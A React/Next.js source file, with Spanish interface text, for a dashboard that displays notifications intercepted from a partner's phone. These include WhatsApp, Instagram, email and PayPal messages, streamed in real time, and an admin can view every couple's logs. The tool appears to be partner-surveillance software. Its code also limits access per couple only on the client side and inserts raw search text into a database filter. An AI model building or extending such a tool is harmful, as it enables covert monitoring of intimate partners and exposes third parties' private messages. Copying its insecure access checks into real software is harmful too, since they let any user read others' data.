'use client'
import { useEffect, useState, useCallback } from 'react'
import { supabase, getAllCouples, type NotificationLog, type Couple } from '@/lib/supabase'

const APP_EMOJI: Record<string, string> = {
  'com.whatsapp': '💬',
  'com.instagram.android': '📸',
  'com.twitter.android': '🐦',
  'com.facebook.katana': '👍',
  'com.facebook.orca': '💙',
  'com.snapchat.android': '👻',
  'com.google.android.gm': '📧',
  'com.google.android.apps.messaging': '💬',
  'com.spotify.music': '🎵',
  'com.netflix.mediaclient': '🎬',
  'com.amazon.mShop.android.shopping': '📦',
  'com.paypal.android.p2pmobile': '💰',
}
function appEmoji(pkg: string) { return APP_EMOJI[pkg] ?? '🔔' }

function fmt(iso: string) {
  const d = new Date(iso)
  return d.toLocaleString('es', {
    day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit'
  })
}

export default function NotificationsPage() {
  const [logs, setLogs]       = useState<NotificationLog[]>([])
  const [couples, setCouples] = useState<Couple[]>([])
  const [total, setTotal]     = useState(0)
  const [loading, setLoading] = useState(true)

  // Sesión actual
  const [session, setSession] = useState<{
    isAdmin: boolean
    coupleId: string | null
    username: string
    coupleName: string
  } | null>(null)

  // Filtros
  const [coupleId, setCoupleId] = useState('')
  const [search, setSearch]     = useState('')
  const [page, setPage]         = useState(0)
  const PER_PAGE = 50

  // Panel de detalle
  const [selected, setSelected] = useState<NotificationLog | null>(null)

  // Realtime badge
  const [liveCount, setLiveCount] = useState(0)

  // Cargar sesión
  useEffect(() => {
    fetch('/api/auth/me')
      .then(res => res.json())
      .then(data => {
        if (data.session) {
          setSession(data.session)
          if (!data.session.isAdmin && data.session.coupleId) {
            setCoupleId(data.session.coupleId)
          }
        }
      })
  }, [])

  // Cargar parejas (solo si es admin)
  useEffect(() => {
    if (session?.isAdmin) {
      getAllCouples().then(setCouples)
    }
  }, [session])

  const load = useCallback(async () => {
    if (!session) return
    setLoading(true)

    // Forzar couple_id si el usuario NO es admin
    const targetCoupleId = session.isAdmin ? coupleId : (session.coupleId || '')

    let q = supabase
      .from('notification_logs')
      .select('*, couples(couple_names,partner_one,partner_two)', { count: 'exact' })
      .order('received_at', { ascending: false })
      .range(page * PER_PAGE, (page + 1) * PER_PAGE - 1)

    if (targetCoupleId) {
      q = q.eq('couple_id', targetCoupleId)
    }
    if (search) {
      q = q.or(`app_name.ilike.%${search}%,title.ilike.%${search}%,text.ilike.%${search}%`)
    }

    const { data, count } = await q
    setLogs((data ?? []) as NotificationLog[])
    setTotal(count ?? 0)
    setLoading(false)
  }, [session, coupleId, search, page])

  useEffect(() => {
    if (session) {
      load()
    }
  }, [session, load])

  // Realtime suscripción filtrada
  useEffect(() => {
    if (!session) return

    const channelName = session.isAdmin
      ? 'admin_notif_realtime'
      : `couple_notif_realtime_${session.coupleId}`

    const channel = supabase
      .channel(channelName)
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'notification_logs',
        ...(session.isAdmin ? {} : { filter: `couple_id=eq.${session.coupleId}` })
      }, (payload) => {
        const newLog = payload.new as NotificationLog
        // Si es admin y tiene filtro de pareja aplicado, verificar
        if (session.isAdmin && coupleId && newLog.couple_id !== coupleId) {
          return
        }
        setLiveCount(c => c + 1)
        setLogs(prev => [newLog, ...prev].slice(0, PER_PAGE))
        setTotal(t => t + 1)
      })
      .subscribe()

    return () => { supabase.removeChannel(channel) }
  }, [session, coupleId])

  const totalPages = Math.ceil(total / PER_PAGE)

  return (
    <div style={{ display: 'flex', height: '100vh', overflow: 'hidden' }}>

      {/* ── Columna principal ── */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>

        {/* Header */}
        <div style={{
          padding: '28px 28px 20px',
          borderBottom: '1px solid rgba(212,175,90,0.2)',
          backgroundColor: '#190407',
          flexShrink: 0,
        }}>
          <div className="responsive-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
            <div>
              <p style={{ fontSize: 9, fontWeight: 800, letterSpacing: 2, color: '#D4AF5A', marginBottom: 4 }}>
                {session?.isAdmin ? 'REGISTRO EN TIEMPO REAL (ADMIN)' : `NOTIFICACIONES PRIVADAS • ${session?.coupleName}`}
              </p>
              <h1 style={{ fontSize: 24, fontWeight: 900, color: '#F7EFE4' }}>
                Notificaciones
              </h1>
              <p style={{ fontSize: 12, color: '#A89186', marginTop: 3 }}>
                {total.toLocaleString()} registros {session?.isAdmin ? 'totales' : 'de tu pareja'}
              </p>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              {liveCount > 0 && (
                <div style={{
                  display: 'flex', alignItems: 'center', gap: 6,
                  backgroundColor: 'rgba(212,175,90,0.12)',
                  border: '1px solid rgba(212,175,90,0.4)',
                  borderRadius: 20, padding: '6px 12px',
                }}>
                  <div style={{ width: 7, height: 7, borderRadius: 4, backgroundColor: '#4ade80' }} />
                  <span style={{ fontSize: 11, fontWeight: 700, color: '#F3E5AB' }}>
                    +{liveCount} en vivo
                  </span>
                </div>
              )}
              <button
                onClick={() => { setLiveCount(0); load() }}
                style={{
                  backgroundColor: '#D4AF5A', color: '#190407',
                  border: 'none', borderRadius: 10, padding: '8px 16px',
                  fontSize: 12, fontWeight: 800, cursor: 'pointer',
                }}
              >
                ↻ Actualizar
              </button>
            </div>
          </div>

          {/* Filtros */}
          <div className="responsive-filters" style={{ display: 'flex', gap: 10, marginTop: 16 }}>
            <input
              value={search}
              onChange={e => { setSearch(e.target.value); setPage(0) }}
              placeholder="Buscar app, título o texto..."
              style={{
                flex: 1, backgroundColor: '#2A080D', border: '1px solid rgba(212,175,90,0.3)',
                borderRadius: 10, padding: '9px 14px', color: '#F7EFE4', fontSize: 13,
                outline: 'none',
              }}
            />
            {/* Dropdown de Parejas solo visible para ADMIN */}
            {session?.isAdmin && (
              <select
                value={coupleId}
                onChange={e => { setCoupleId(e.target.value); setPage(0) }}
                style={{
                  backgroundColor: '#2A080D', border: '1px solid rgba(212,175,90,0.3)',
                  borderRadius: 10, padding: '9px 14px', color: '#C7B7A3', fontSize: 13,
                  minWidth: 180, outline: 'none', cursor: 'pointer',
                }}
              >
                <option value="">Todas las parejas</option>
                {couples.map(c => (
                  <option key={c.id} value={c.id}>{c.couple_names}</option>
                ))}
              </select>
            )}
          </div>
        </div>

        {/* Tabla */}
        <div style={{ flex: 1, overflowY: 'auto', padding: '0 0 80px' }}>
          {loading ? (
            <div style={{ padding: 40, textAlign: 'center', color: '#A89186' }}>Cargando...</div>
          ) : logs.length === 0 ? (
            <div style={{ padding: 60, textAlign: 'center' }}>
              <p style={{ fontSize: 40, marginBottom: 12 }}>🔕</p>
              <p style={{ color: '#A89186', fontSize: 14 }}>No se encontraron notificaciones</p>
              {!session?.isAdmin && (
                <p style={{ color: '#6D2932', fontSize: 12, marginTop: 4 }}>
                  Las notificaciones que reciba el teléfono de tu pareja aparecerán aquí automáticamente.
                </p>
              )}
            </div>
          ) : (
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ borderBottom: '1px solid rgba(212,175,90,0.15)', position: 'sticky', top: 0, backgroundColor: '#190407', zIndex: 1 }}>
                  {['App', 'Título', 'Texto', session?.isAdmin ? 'Pareja' : '', 'Hora'].filter(Boolean).map(h => (
                    <th key={h} style={{
                      padding: '10px 14px', textAlign: 'left',
                      fontSize: 9, fontWeight: 800, letterSpacing: 1.3, color: '#D4AF5A',
                    }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {logs.map((log, i) => (
                  <tr
                    key={log.id}
                    onClick={() => setSelected(log)}
                    style={{
                      borderBottom: '1px solid rgba(109,41,50,0.3)',
                      backgroundColor: selected?.id === log.id
                        ? 'rgba(212,175,90,0.08)'
                        : i % 2 === 0 ? 'transparent' : 'rgba(42,8,13,0.4)',
                      cursor: 'pointer',
                      transition: 'background 0.1s',
                    }}
                  >
                    <td style={{ padding: '10px 14px', fontSize: 13, color: '#F3E5AB', fontWeight: 600, whiteSpace: 'nowrap' }}>
                      {appEmoji(log.package_name)} {log.app_name}
                    </td>
                    <td style={{ padding: '10px 14px', fontSize: 12, color: '#EFE5D8', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                      {log.title ?? <span style={{ color: '#6D2932' }}>—</span>}
                    </td>
                    <td style={{ padding: '10px 14px', fontSize: 12, color: '#C7B7A3', maxWidth: 260, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                      {log.big_text || log.text || <span style={{ color: '#6D2932' }}>—</span>}
                    </td>
                    {session?.isAdmin && (
                      <td style={{ padding: '10px 14px', fontSize: 11, color: '#A89186', whiteSpace: 'nowrap' }}>
                        {(log.couples as any)?.couple_names ?? '—'}
                      </td>
                    )}
                    <td style={{ padding: '10px 14px', fontSize: 11, color: '#6D2932', whiteSpace: 'nowrap' }}>
                      {fmt(log.received_at)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>

        {/* Paginación */}
        {totalPages > 1 && (
          <div style={{
            padding: '12px 20px', borderTop: '1px solid rgba(212,175,90,0.15)',
            display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8,
            backgroundColor: '#190407', flexShrink: 0,
          }}>
            <button
              onClick={() => setPage(p => Math.max(0, p - 1))}
              disabled={page === 0}
              style={{ ...btnStyle, opacity: page === 0 ? 0.4 : 1 }}
            >‹ Anterior</button>
            <span style={{ fontSize: 12, color: '#A89186', padding: '0 8px' }}>
              Página {page + 1} de {totalPages}
            </span>
            <button
              onClick={() => setPage(p => Math.min(totalPages - 1, p + 1))}
              disabled={page >= totalPages - 1}
              style={{ ...btnStyle, opacity: page >= totalPages - 1 ? 0.4 : 1 }}
            >Siguiente ›</button>
          </div>
        )}
      </div>

      {/* ── Panel de detalle ── */}
      {selected && (
        <div className="notif-detail-panel" style={{
          width: 320, flexShrink: 0,
          backgroundColor: '#2A080D',
          borderLeft: '1px solid rgba(212,175,90,0.25)',
          overflowY: 'auto',
          padding: 24,
          display: 'flex', flexDirection: 'column', gap: 20,
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <p style={{ fontSize: 10, fontWeight: 800, letterSpacing: 1.5, color: '#D4AF5A' }}>DETALLE</p>
            <button onClick={() => setSelected(null)} style={{ background: 'none', border: 'none', color: '#A89186', fontSize: 18, cursor: 'pointer', lineHeight: 1 }}>✕</button>
          </div>

          {/* App */}
          <div>
            <p style={labelStyle}>APLICACIÓN</p>
            <p style={{ fontSize: 20, marginTop: 2 }}>{appEmoji(selected.package_name)}</p>
            <p style={{ fontSize: 15, fontWeight: 800, color: '#F3E5AB', marginTop: 4 }}>{selected.app_name}</p>
            <p style={{ fontSize: 11, color: '#6D2932', marginTop: 2 }}>{selected.package_name}</p>
          </div>

          {/* Pareja (solo admin) */}
          {session?.isAdmin && (
            <Field label="PAREJA" value={(selected.couples as any)?.couple_names ?? '—'} />
          )}

          {/* Título */}
          {selected.title && <Field label="TÍTULO" value={selected.title} />}

          {/* Texto */}
          {selected.text && <Field label="TEXTO" value={selected.text} />}

          {/* Big Text */}
          {selected.big_text && selected.big_text !== selected.text && (
            <Field label="TEXTO EXPANDIDO" value={selected.big_text} />
          )}

          {/* Sub text */}
          {selected.sub_text && <Field label="SUBTÍTULO" value={selected.sub_text} />}

          {/* Timestamps */}
          <div>
            <p style={labelStyle}>RECIBIDA</p>
            <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3 }}>{fmt(selected.received_at)}</p>
          </div>
          <div>
            <p style={labelStyle}>GUARDADA EN SUPABASE</p>
            <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3 }}>{fmt(selected.created_at)}</p>
          </div>
        </div>
      )}
    </div>
  )
}

function Field({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <p style={labelStyle}>{label}</p>
      <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3, lineHeight: 1.5, wordBreak: 'break-word' }}>{value}</p>
    </div>
  )
}

const labelStyle: React.CSSProperties = {
  fontSize: 9, fontWeight: 800, letterSpacing: 1.4, color: '#6D2932',
}

const btnStyle: React.CSSProperties = {
  backgroundColor: '#4D141C', border: '1px solid rgba(212,175,90,0.3)',
  borderRadius: 8, padding: '6px 14px', color: '#C7B7A3',
  fontSize: 12, fontWeight: 600, cursor: 'pointer',
}
